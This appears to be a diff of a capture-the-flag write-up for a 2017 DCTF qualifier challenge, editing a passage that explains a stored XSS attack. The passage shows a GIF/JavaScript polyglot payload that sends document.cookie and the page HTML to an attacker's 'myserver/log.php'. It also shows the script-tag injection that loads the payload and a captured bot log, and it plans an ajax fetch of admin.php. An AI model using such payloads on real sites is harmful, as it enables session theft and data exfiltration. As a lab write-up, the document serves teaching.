@@ -18,7 +18,7 @@ GIF89a/*
   ? ,    /*
    ;*/=1;document.location='https://myserver/log.php?x='+encodeURIComponent(document.cookie+document.getElementsByTagName('html')[0].innerHTML+document.cookie);
 ```
-Now we include the image through a script tag in the message field: `<script src=/path/to/image.gif></script>` and here is what I got in the logs file: 
+Now we include the image through a script tag in the message field: `<script src=/__acf23acea0ea2f39205ab707c8ed19d3/x.gif></script>` and here is what I got in the logs file: 
 ```
 IP: 45.76.95.55 - September 30, 2017, 12:41 pm
 REFERRER: https://llc.dctf-quals-17.def.camp//bot.php?id=258
@@ -39,7 +39,7 @@ Array
 )
 ```
 
-We didn't get the flag, so it's probably in the `admin.php` file, all we have to do is to get its contents through an ajax request (jquery is alread loaded). 
+We didn't get the flag, so it's probably in the `admin.php` file, all we have to do is to get its contents through an ajax request (jquery already loaded). 
 ```javascript
 GIF89a/*
   ? ,    /*
